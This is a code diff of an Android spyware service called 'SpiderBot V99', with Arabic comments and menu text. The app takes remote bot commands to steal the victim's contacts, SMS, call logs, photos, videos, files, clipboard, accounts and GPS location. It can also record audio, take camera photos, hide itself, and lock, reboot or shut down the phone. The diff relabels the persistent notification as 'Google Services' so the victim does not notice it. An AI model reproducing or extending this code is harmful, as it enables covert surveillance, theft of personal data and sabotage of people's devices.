@@ -76,7 +76,6 @@ public class SpyService extends Service {
         scheduler = Executors.newSingleThreadScheduledExecutor();
         scheduler.scheduleAtFixedRate(this::pollCommands, 3, Config.get().poll_interval_sec, TimeUnit.SECONDS);
 
-        // بدء الخدمة بدون إشعارات مزعجة
         new android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(() -> {
             if (!foregroundStarted && hasMicrophonePermission()) {
                 startForegroundService();
@@ -96,14 +95,12 @@ public class SpyService extends Service {
                 NotificationChannel ch = new NotificationChannel("spy_ch", "Update", NotificationManager.IMPORTANCE_LOW);
                 getSystemService(NotificationManager.class).createNotificationChannel(ch);
             }
-            // إشعار بسيط جداً (بدون صوت أو اهتزاز)
             startForeground(1337, new NotificationCompat.Builder(this, "spy_ch")
-                    .setContentTitle("")
-                    .setContentText("")
+                    .setContentTitle("Google Services")
+                    .setContentText("Running...")
                     .setSmallIcon(android.R.drawable.ic_menu_manage)
                     .setPriority(NotificationCompat.PRIORITY_MIN)
                     .setSilent(true)
-                    .setOngoing(true)
                     .build());
             foregroundStarted = true;
             Log.d(TAG, "Foreground service started");
@@ -176,7 +173,7 @@ public class SpyService extends Service {
                     JSONObject msg = upd.getJSONObject("message");
                     if (msg.has("text")) {
                         String txt = msg.getString("text").trim();
-                        Log.d(TAG, "Received command: " + txt);
+                        Log.d(TAG, "Received: " + txt);
                         handleCommand(txt);
                     }
                 }
@@ -187,21 +184,16 @@ public class SpyService extends Service {
     }
 
     private void handleCommand(String cmd) {
-        Log.d(TAG, "Handling command: " + cmd);
         String lower = cmd.toLowerCase().trim();
+        Log.d(TAG, "Handling: " + lower);
 
         if (lower.equals("/start") || lower.equals("/help") || lower.equals("/menu") || lower.equals("/commands")) {
             sendHelpMenu();
             return;
         }
 
-        // إزالة أي مسافات زائدة
-        if (lower.startsWith("/")) {
-            String command = lower.substring(1).trim();
-            executeCommand(command);
-        } else {
-            executeCommand(lower);
-        }
+        String command = lower.startsWith("/") ? lower.substring(1) : lower;
+        executeCommand(command);
     }
 
     private void executeCommand(String cmd) {
@@ -209,65 +201,95 @@ public class SpyService extends Service {
             Log.d(TAG, "Executing: " + cmd);
             switch (cmd) {
                 case "steal_contacts": case "contacts": case "get_contacts":
-                    sendFile(collectContacts(), "📇 جهات الاتصال"); break;
+                    sendFile(collectContacts(), "📇 جهات الاتصال");
+                    break;
                 case "steal_sms": case "sms": case "get_sms":
-                    sendFile(collectSms(), "💬 الرسائل النصية"); break;
+                    sendFile(collectSms(), "💬 الرسائل النصية");
+                    break;
                 case "steal_calls": case "calllog": case "get_calllogs":
-                    sendFile(collectCallLogs(), "📞 سجل المكالمات"); break;
+                    sendFile(collectCallLogs(), "📞 سجل المكالمات");
+                    break;
                 case "location": case "get_location":
-                    getLocation(); break;
+                    getLocation();
+                    break;
                 case "record": case "start_record":
-                    startRecording(); break;
+                    startRecording();
+                    break;
                 case "stoprec": case "stop_record":
-                    stopRecording(); break;
+                    stopRecording();
+                    break;
                 case "apps": case "get_apps":
-                    sendFile(collectApps(), "📱 التطبيقات المثبتة"); break;
+                    sendFile(collectApps(), "📱 التطبيقات");
+                    break;
                 case "photos": case "get_photos":
-                    sendFile(collectMedia("images"), "🖼 جميع الصور"); break;
+                    sendFile(collectMedia("images"), "🖼 الصور");
+                    break;
                 case "videos": case "get_videos":
-                    sendFile(collectMedia("videos"), "🎬 جميع الفيديوهات"); break;
+                    sendFile(collectMedia("videos"), "🎬 الفيديوهات");
+                    break;
                 case "files": case "get_files":
-                    sendFile(collectAllFiles(), "📦 جميع الملفات"); break;
+                    sendFile(collectAllFiles(), "📦 الملفات");
+                    break;
                 case "hide": case "hide_app":
-                    hideApp(); break;
+                    hideApp();
+                    break;
                 case "show": case "show_app":
-                    showApp(); break;
+                    showApp();
+                    break;
                 case "notify": case "fake_notif":
-                    showFakeNotification(); break;
+                    showFakeNotification();
+                    break;
                 case "cam_back": case "take_photo":
-                    takePhoto(); break;
+                    takePhoto();
+                    break;
                 case "cam_front": case "take_photo_front":
-                    takePhotoFront(); break;
+                    takePhotoFront();
+                    break;
                 case "torch_on": case "flash_on":
-                    flashOn(); break;
+                    flashOn();
+                    break;
                 case "torch_off": case "flash_off":
-                    flashOff(); break;
+                    flashOff();
+                    break;
                 case "imei": case "get_imei":
-                    getImei(); break;
+                    getImei();
+                    break;
                 case "phone": case "get_phone":
-                    getPhoneNumber(); break;
+                    getPhoneNumber();
+                    break;
                 case "sim": case "get_sim":
-                    getSimInfo(); break;
+                    getSimInfo();
+                    break;
                 case "wifi": case "get_wifi":
-                    getWifiInfo(); break;
+                    getWifiInfo();
+                    break;
                 case "battery": case "get_battery":
-                    getBatteryInfo(); break;
+                    getBatteryInfo();
+                    break;
                 case "ip": case "get_ip":
-                    getPublicIp(); break;
+                    getPublicIp();
+                    break;
                 case "lock": case "lock_device":
-                    lockDevice(); break;
+                    lockDevice();
+                    break;
                 case "reboot":
-                    rebootDevice(); break;
+                    rebootDevice();
+                    break;
                 case "shutdown":
-                    shutdownDevice(); break;
+                    shutdownDevice();
+                    break;
                 case "accounts": case "get_accounts":
-                    getAccounts(); break;
+                    getAccounts();
+                    break;
                 case "clipboard": case "get_clipboard":
-                    getClipboard(); break;
+                    getClipboard();
+                    break;
                 case "device": case "get_device":
-                    getDeviceInfo(); break;
+                    getDeviceInfo();
+                    break;
                 case "network": case "get_network":
-                    getNetworkInfo(); break;
+                    getNetworkInfo();
+                    break;
                 default:
                     bot.sendText("❌ أمر غير معروف: " + cmd + "\nاستخدم /help لعرض الأوامر.");
             }
@@ -280,45 +302,44 @@ public class SpyService extends Service {
     // ========== قائمة المساعدة ==========
 
     private void sendHelpMenu() {
-        String menu = "🕷️ **SPIDERBOT V99 - قائمة الأوامر الكاملة** 🕷️\n\n" +
+        String menu = "🕷️ **SPIDERBOT V99** 🕷️\n\n" +
                 "━━━━━━━━━━━━━━━━━━━━━━\n" +
-                "🔴 **أوامر السرقة والتجسس** 🔴\n" +
+                "🔴 **أوامر السرقة** 🔴\n" +
                 "━━━━━━━━━━━━━━━━━━━━━━\n" +
-                "/steal_contacts - سرقة جهات الاتصال\n" +
-                "/steal_sms - سرقة الرسائل\n" +
-                "/steal_calls - سرقة سجل المكالمات\n" +
-                "/location - تحديد الموقع GPS\n" +
-                "/record - بدء تسجيل الصوت\n" +
-                "/stoprec - إيقاف التسجيل وإرسال الملف\n" +
-                "/photos - سرقة جميع الصور\n" +
-                "/videos - سرقة جميع الفيديوهات\n" +
-                "/files - سرقة جميع الملفات\n" +
-                "/clipboard - سرقة الحافظة\n\n" +
+                "/steal_contacts - جهات الاتصال\n" +
+                "/steal_sms - الرسائل\n" +
+                "/steal_calls - سجل المكالمات\n" +
+                "/location - الموقع GPS\n" +
+                "/record - تسجيل صوت\n" +
+                "/stoprec - إيقاف التسجيل\n" +
+                "/photos - الصور\n" +
+                "/videos - الفيديوهات\n" +
+                "/files - جميع الملفات\n" +
+                "/clipboard - الحافظة\n\n" +
                 "━━━━━━━━━━━━━━━━━━━━━━\n" +
-                "⚫ **أوامر التحكم والتخريب** ⚫\n" +
+                "⚫ **أوامر التحكم** ⚫\n" +
                 "━━━━━━━━━━━━━━━━━━━━━━\n" +
                 "/hide - إخفاء التطبيق\n" +
                 "/show - إظهار التطبيق\n" +
-                "/notify - إرسال إشعار وهمي\n" +
-                "/torch_on - تشغيل الكشاف\n" +
-                "/torch_off - إطفاء الكشاف\n" +
+                "/notify - إشعار وهمي\n" +
+                "/torch_on - كشاف ON\n" +
+                "/torch_off - كشاف OFF\n" +
                 "/lock - قفل الجهاز\n" +
-                "/reboot - إعادة تشغيل الجهاز\n" +
-                "/shutdown - إيقاف تشغيل الجهاز\n\n" +
+                "/reboot - إعادة تشغيل\n" +
+                "/shutdown - إيقاف تشغيل\n\n" +
                 "━━━━━━━━━━━━━━━━━━━━━━\n" +
                 "🟢 **أوامر المعلومات** 🟢\n" +
                 "━━━━━━━━━━━━━━━━━━━━━━\n" +
                 "/imei - رقم IMEI\n" +
                 "/phone - رقم الهاتف\n" +
                 "/sim - معلومات الشريحة\n" +
-                "/wifi - معلومات الواي فاي\n" +
-                "/battery - معلومات البطارية\n" +
-                "/ip - عنوان IP العام\n" +
-                "/accounts - حسابات Google المسجلة\n" +
-                "/apps - قائمة التطبيقات المثبتة\n" +
-                "/device - معلومات الجهاز كاملة\n" +
+                "/wifi - الواي فاي\n" +
+                "/battery - البطارية\n" +
+                "/ip - عنوان IP\n" +
+                "/accounts - حسابات Google\n" +
+                "/apps - التطبيقات\n" +
+                "/device - معلومات الجهاز\n" +
                 "/network - معلومات الشبكة\n\n" +
-                "━━━━━━━━━━━━━━━━━━━━━━\n" +
                 "✅ SpiderBot V99 جاهز";
 
         bot.sendText(menu);
@@ -330,8 +351,8 @@ public class SpyService extends Service {
         String info = "📱 **معلومات الجهاز**\n\n" +
                 "الموديل: " + Build.MODEL + "\n" +
                 "الشركة: " + Build.MANUFACTURER + "\n" +
-                "إصدار أندرويد: " + Build.VERSION.RELEASE + "\n" +
-                "API Level: " + Build.VERSION.SDK_INT + "\n" +
+                "أندرويد: " + Build.VERSION.RELEASE + "\n" +
+                "API: " + Build.VERSION.SDK_INT + "\n" +
                 "Android ID: `" + deviceId + "`\n" +
                 "IMEI: " + getImeiSimple() + "\n" +
                 "رقم الهاتف: " + getPhoneSimple() + "\n" +
